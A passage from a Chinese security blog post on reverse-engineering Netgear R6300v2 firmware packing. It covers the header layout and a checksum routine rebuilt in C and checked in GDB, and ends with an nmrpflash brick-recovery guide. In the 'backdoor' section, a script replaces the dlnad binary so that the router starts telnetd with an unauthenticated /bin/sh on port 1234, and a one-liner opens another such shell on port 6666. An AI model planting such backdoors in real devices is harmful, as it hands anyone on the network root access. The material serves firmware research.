#define AMBIT_SOFTWARE_VERSION     &#34;V1.0.3.2&#34;

#define AMBIT_UI_VERSION           &#34;1.0.57&#34;

#define STRING_TBL_VERSION         &#34;1.0.3.2_2.1.33.8&#34;
</code></pre></div><p>如果要打包别的版本固件需要对这里的字段修改成对应固件版本的信息。</p>
<p>接下来就是对三个输出文件添加header，这三个输出都是采用fwrite函数，将<strong>malloc_chunk</strong>的内容输入到文件中</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142747.png" alt="img"></p>
<p>查看<strong>addheader</strong>函数中对<strong>malloc_chunk</strong>的引用，可以发现，修改<strong>malloc_chunk</strong>的地方只要下面的代码</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">memcpy(malloc_chunk, v20, v24);
memcpy((char *)malloc_chunk + v24, &amp;s, v26);
memcpy((char *)malloc_chunk + v25, dest, v27);
</code></pre></div><p>v20数组中先是存储了4个字节的字符串然后拷贝进了固件的版本信息</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142748.png" alt="img"></p>
<p>然后拷贝了 <strong>kernel_checksum</strong> 和 <strong>rootfs_checksum</strong> 接着是对kernel文件长度和rootfs文件长度的信息，然后是<strong>rootfs_kernel_checksum</strong>，填充4字节0，加上<strong>compatible.txt</strong>里的内容，最后对整个头部再求一个checksum，将结果填充进刚才4字节0的位置</p>
<h4 id="calculate_checksum">calculate_checksum</h4>
<p>接下来分析这里的计算checksum的函数</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142749.png" alt="img"></p>
<p>第一次调用时a1 = 0，所以<strong>c1 = 0,c0 = 0</strong></p>
<p>第二次调用时a1 = 1</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142750.png" alt="img"></p>
<p>这里的逻辑很简单,就是从file中每次读取一个字节的数据，然后</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">c0 += *(unsigned char *)(kernel_file+i);
c1 += c0;
</code></pre></div><p>为了验证这里的计算结果，我使用GDB调试packet
查看程序的保护措施</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre></div><p>只开启了NX，没有地址随机化，所以调试起来很方便</p>
<p>使用gdb加载packet，设置 args 后输入</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">set args  -k linux.bin -f _R6300v2-V1.0.3.2_1.0.57.chk.extracted/20E2BA.squashfs -b compatible_r6300v2.txt -ok kernel -oall kernel_rootfs -or rootfs -i ambitCfg.h
</code></pre></div><p>我根据IDA反汇编的逻辑，自己写了一个C的计算checksum代码，如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;stdint.h&gt;

int c1,c0;

int main()
{
    //FILE *kernel_file_fd = fopen(&#34;R6300v2-V1.0.3.2_1.0.57.chk&#34;,&#34;rb&#34;);
    FILE *kernel_file_fd = fopen(&#34;1&#34;,&#34;rb&#34;);
    void *kernel_file = malloc(0x2000000);
    int file_len = fread(kernel_file,1,0x2000000,kernel_file_fd);
    int i;
    for(i=0;i&lt;file_len;i++){
        c0 += *(unsigned char *)(kernel_file+i);
        c1 += c0;
    }
    c0 = (c0 &amp; 0x0ffff) + ((unsigned int)c0 &gt;&gt; 16);
    c0  = ((c0 &gt;&gt; 16) + c0) &amp; 0xffff;
    c1 = (c1 &amp; 0x0ffff) + ((unsigned int)c1 &gt;&gt; 16);
    c1  = ((c1 &gt;&gt; 16) + c1) &amp; 0xffff;
    int checksum;
    checksum = (c1 &lt;&lt; 16) | c0;
    printf(&#34;0x%x&#34;,checksum);
}
</code></pre></div><p>首先在对rootfs计算checksum的位置下断点，通过查看计算的checksum</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-16231427501.png" alt="img"></p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142752.png" alt="img"></p>
<p>与C计算的一致
接下来计算对linux kernel的checksum</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142755.png" alt="img"></p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142756.png" alt="img"></p>
<p>发现与C计算的也是一致的</p>
<p>接下来是计算了rootfs+linux kernel的checksum</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142758.png" alt="img"></p>
<p>第一部分校验和是对TRX header + linux kernel + squashfs文件系统的校验</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142759.png" alt="img"></p>
<p>56.7z 对应着固件中linux kernel+squashfs文件系统的部分</p>
<h2 id="修改固件">修改固件</h2>
<h3 id="设置后门">设置后门</h3>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cd rootfs/usr/sbin
mv dlnad dlnadd
touch dlnad
vim dlnad
 #!/bin/sh

/usr/sbin/telnetd -F -l /bin/sh -p 1234 &amp;
/usr/sbin/dlnadd &amp;
sudo chown 777 dlnad
</code></pre></div><p>将修改后的文件系统重新打包上传</p>
<p>在netgear某些版本中，无法直接开启telnet需要先创建设备文件
完整命令如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p6666 -l/bin/sh
</code></pre></div><p>完整流程图如下：</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142761.png" alt="img"></p>
<h1 id="netgear救砖教程">netgear救砖教程</h1>
<ul>
<li>下载nmrpflash.exe工具</li>
</ul>
<p>链接：https://pan.baidu.com/s/140aE74ZUsRMcW1sbdLYqYQ，
提取码：opw4</p>
<ul>
<li>配置静态IP</li>
</ul>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142762.png" alt="img"></p>
<ul>
<li>用管理员权限打开cmd</li>
</ul>
<p>使用网线插上netgear lan口，在命令行中进入刚下载工具的目录</p>
<p>输入命令nmrpflash.exe -L查询网卡编号</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-1623142763.png" alt="img"></p>
<p>这里可以看到对应的编号是net1</p>
<ul>
<li>上传固件
查询好编号后，执行命令</li>
</ul>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nmrpflash.exe -i net1 -f R6220-V1.1.0.86.img
</code></pre></div><p>开启救砖之路，值得注意的是，此命令执行的时机为：在命令提示符中输入好指令后，此时路由在处于关机状态，开启路由器电源，等待5秒，执行命令，大概等待1-5分钟左右的时间，即可恢复成功。命令执行时机决定救砖是否成功，可以不断尝试，直到成功。</p>
<p><img src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-160480-16231427631.png" alt="img"></p>
<p><strong>本文作者：<a href="https://www.secpulse.com/archives/newpage/author?author_id=3747">ChaMd5安全团队</a></strong></p>
<p><strong>本文为安全脉搏专栏作者发布，转载请注明：</strong><a href="https://www.secpulse.com/archives/160480.html"><strong>https://www.secpulse.com/archives/160480.html</strong></a></p>
<p><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31010402005682">http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31010402005682</a>)</p>

    </div>
    <footer class="post-footer">
     
 
<div class="post-tags">     
     
    <a href="http://shanks.link/tags/openwrt" rel="tag" title="OpenWrt">#OpenWrt#</a>
    
</div>



     <div class="post-nav">
    <div class="post-nav-next post-nav-item">
    
        <a href="http://shanks.link/blog/2023/04/26/%E5%B0%8F%E7%B1%B3%E5%9B%BA%E4%BB%B6mkxqimage/" rel="next" title="小米固件mkxqimage">
        <i class="fa fa-chevron-left"></i> 小米固件mkxqimage
        </a>
    
    </div>

    <div class="post-nav-prev post-nav-item">
    
        <a href="http://shanks.link/blog/2023/03/23/openvpn-%E9%83%A8%E7%BD%B2/" rel="prev" title="OpenVPN 部署">
        OpenVPN 部署 <i class="fa fa-chevron-right"></i>
        </a>
    
    </div>
</div>
      
     
     
     





<script src="https://utteranc.es/client.js"
        repo="shankusu2017@gmail.com/"
        issue-term="pathname"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
<noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </footer>
  </article>
</section>

          </div>
        </div>
        <div class="sidebar-toggle">
  <div class="sidebar-toggle-line-wrap">
    <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
    <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
    <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
  </div>
</div>
<aside id="sidebar" class="sidebar">
  <div class="sidebar-inner">

    <section class="site-overview sidebar-panel  sidebar-panel-active ">
      <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image"
        src="http://shanks.link/img/logo.jpg"
        alt="shankusu2017@gmail.com" />
    <p class="site-author-name" itemprop="name">shankusu2017@gmail.com</p>
    <p class="site-description motion-element" itemprop="description"> </p>
</div>
      <nav class="site-state motion-element">
    <div class="site-state-item site-state-posts">
        <a href="http://shanks.link/post/">
            <span class="site-state-item-name">日志</span>
        </a>
    </div>
    <div class="site-state-item site-state-categories">
        <a href="http://shanks.link/categories/">
            <span class="site-state-item-name">分类</span>
        </a>
    </div>

    <div class="site-state-item site-state-tags">
        <a href="http://shanks.link/tags/">
            <span class="site-state-item-name">标签</span>
        </a>
    </div>
</nav>

      
      
<div class="links-of-author motion-element">
    
        <span class="links-of-author-item">
        <a href="https://github.com/shankusu2017" target="_blank" title="GitHub">
            <i class="fa fa-fw fa-github"></i>
            GitHub
        </a>
        </span>
    
</div>


      

      <div class="links-of-blogroll motion-element inline">
<script type="text/javascript" src="//rf.revolvermaps.com/0/0/8.js?i=5b4f2ucxar6&amp;m=0&amp;s=220&amp;c=ff0000&amp;cr1=ffffff&amp;f=arial&amp;l=33&amp;bv=35" async="async"></script>
</div>

    </section>
    
  </div>
</aside>

      </div>
    </main>
   
    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  <span itemprop="copyrightYear">  &copy; 
  2009 - 2024</span>
</div>
<div>
  <a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备2021068940号-1</a>
  <a href="https://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011302003059" rel="noopener" target="_blank">粤公网安备44011302003059</a>
</div>


      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
      <span id="scrollpercent"><span>0</span>%</span>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>
<script type="text/javascript" src="http://shanks.link/js/vendor/jquery/index.js?v=2.1.3"></script>
<script type="text/javascript" src="http://shanks.link/js/vendor/fastclick/lib/fastclick.min.js?v=1.0.6"></script> 
<script type="text/javascript" src="http://shanks.link/js/vendor/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
<script type="text/javascript" src="http://shanks.link/js/vendor/velocity/velocity.min.js?v=1.2.1"></script>
<script type="text/javascript" src="http://shanks.link/js/vendor/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="http://shanks.link/js/vendor/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>

<script src="http://shanks.link/js/vendor/fancybox/jquery.fancybox.pack.js?v=2.1.5"></script>

<script type="text/javascript" src="http://shanks.link/js/utils.js"></script>
<script type="text/javascript" src="http://shanks.link/js/motion.js"></script>
<script type="text/javascript" src="http://shanks.link/js/affix.js"></script>
<script type="text/javascript" src="http://shanks.link/js/schemes/pisces.js"></script>

<script type="text/javascript" src="http://shanks.link/js/scrollspy.js"></script>
<script type="text/javascript" src="http://shanks.link/js/post-details.js"></script>
<script type="text/javascript" src="http://shanks.link/js/toc.js"></script>

<script type="text/javascript" src="http://shanks.link/js/bootstrap.js"></script>

<script type="text/javascript" src="http://shanks.link/js/search.js"></script>
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    extensions: ["tex2jax.js"],
    jax: ["input/TeX", "output/HTML-CSS"],
    tex2jax: {
      inlineMath: [ ['$','$'] ],
      displayMath: [ ['$$','$$'] ],
      processEscapes: true
    },
    "HTML-CSS": { fonts: ["TeX"] }
  });
</script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML' async></script>
</body>
</html>